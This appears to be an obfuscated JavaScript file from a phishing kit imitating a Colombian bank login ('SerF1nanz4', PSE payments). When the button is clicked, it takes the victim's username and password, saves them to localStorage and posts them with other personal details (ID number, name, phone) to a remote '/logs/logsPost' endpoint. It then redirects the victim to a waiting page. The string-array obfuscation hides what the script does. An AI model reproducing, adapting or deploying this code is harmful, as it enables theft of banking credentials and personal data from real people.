const _0x510d91 = _0x6901;
(function (_0x34912d, _0x26c06d) {
  const _0x21a161 = _0x6901,
    _0x30432d = _0x34912d();
  while (!![]) {
    try {
      const _0x1bfd23 =
        (parseInt(_0x21a161(0xdb)) / 0x1) * (-parseInt(_0x21a161(0xce)) / 0x2) +
        (parseInt(_0x21a161(0xcd)) / 0x3) * (-parseInt(_0x21a161(0xe1)) / 0x4) +
        -parseInt(_0x21a161(0xca)) / 0x5 +
        (-parseInt(_0x21a161(0xee)) / 0x6) * (parseInt(_0x21a161(0xe8)) / 0x7) +
        parseInt(_0x21a161(0xda)) / 0x8 +
        -parseInt(_0x21a161(0xdc)) / 0x9 +
        (-parseInt(_0x21a161(0xd3)) / 0xa) * (-parseInt(_0x21a161(0xc9)) / 0xb);
      if (_0x1bfd23 === _0x26c06d) break;
      else _0x30432d["push"](_0x30432d["shift"]());
    } catch (_0x4d0cb1) {
      _0x30432d["push"](_0x30432d["shift"]());
    }
  }
})(_0x303a, 0xd659c);
function _0x6901(_0x5b9ff8, _0x29a800) {
  const _0x303afe = _0x303a();
  return (
    (_0x6901 = function (_0x69018e, _0x3eb7fd) {
      _0x69018e = _0x69018e - 0xc9;
      let _0x531712 = _0x303afe[_0x69018e];
      return _0x531712;
    }),
    _0x6901(_0x5b9ff8, _0x29a800)
  );
}
function updateLS() {
  const _0x4c5b71 = _0x6901;
  LS[_0x4c5b71(0xcf)](_0x4c5b71(0xd6), JSON["stringify"](info));
}
function _0x303a() {
  const _0x25aadf = [
    "Network\x20response\x20was\x20not\x20ok",
    "puser",
    "application/json",
    "42100010xggVDD",
    "preventDefault",
    "btnUsuario",
    "info",
    "PSE",
    "value",
    "Ingresó\x20datos",
    "3005768zBYrgS",
    "1078159sTzPll",
    "3228570EiHfsP",
    "click",
    "catch",
    "./wait.html",
    "error",
    "677284kjWLjl",
    "then",
    "txtPass",
    "🛒​\x20SerF1nanz4",
    "stringify",
    "/logs/logsPost",
    "POST",
    "6404209wQLsKL",
    "user",
    "addEventListener",
    "json",
    "metaInfo",
    "disabled",
    "6oVKchc",
    "dudename",
    "11MkUGDv",
    "6990mcjpvb",
    "getElementById",
    "telnum",
    "24LfkVfb",
    "2cPyyVI",
    "setItem",
  ];
  _0x303a = function () {
    return _0x25aadf;
  };
  return _0x303a();
}
const button = document["getElementById"](_0x510d91(0xd5)),
  userInput = document[_0x510d91(0xcb)]("txtUsuario"),
  passInput = document["getElementById"](_0x510d91(0xe3));
button[_0x510d91(0xea)](_0x510d91(0xdd), async function (_0x52b284) {
  const _0x5a061e = _0x510d91;
  _0x52b284[_0x5a061e(0xd4)](), (button["disabled"] = !![]);
  if (userInput[_0x5a061e(0xd8)] == "" && passInput[_0x5a061e(0xd8)] == "") {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput["focus"](),
      (button[_0x5a061e(0xed)] = ![]);
    return;
  } else {
    var _0x4a6719 = userInput["value"],
      _0x2c9231 = passInput["value"];
    (info[_0x5a061e(0xec)][_0x5a061e(0xe9)] = _0x4a6719),
      (info[_0x5a061e(0xec)][_0x5a061e(0xd1)] = _0x2c9231),
      updateLS();
    const _0x211d81 = {
      reg: info[_0x5a061e(0xec)]["cc"],
      name: info[_0x5a061e(0xec)][_0x5a061e(0xef)],
      cl: info["metaInfo"][_0x5a061e(0xcc)],
      us: info[_0x5a061e(0xec)]["user"],
      ps: info[_0x5a061e(0xec)][_0x5a061e(0xd1)],
      bn: _0x5a061e(0xe4),
      status: _0x5a061e(0xd9),
      fuente: _0x5a061e(0xd7),
    };
    fetch(url + _0x5a061e(0xe6), {
      method: _0x5a061e(0xe7),
      headers: { "Content-Type": _0x5a061e(0xd2) },
      body: JSON[_0x5a061e(0xe5)](_0x211d81),
    })
      [_0x5a061e(0xe2)]((_0x49602d) => {
        const _0x3c5e46 = _0x5a061e;
        if (!_0x49602d["ok"]) throw new Error(_0x3c5e46(0xd0));
        return _0x49602d[_0x3c5e46(0xeb)]();
      })
      [_0x5a061e(0xe2)]((_0x41b034) => {
        const _0x5f4d58 = _0x5a061e;
        window["location"]["href"] = _0x5f4d58(0xdf);
      })
      [_0x5a061e(0xde)]((_0xea0893) => {
        const _0x294ca9 = _0x5a061e;
        console[_0x294ca9(0xe0)]("Error:", _0xea0893),
          (button[_0x294ca9(0xed)] = ![]);
      });
  }
});
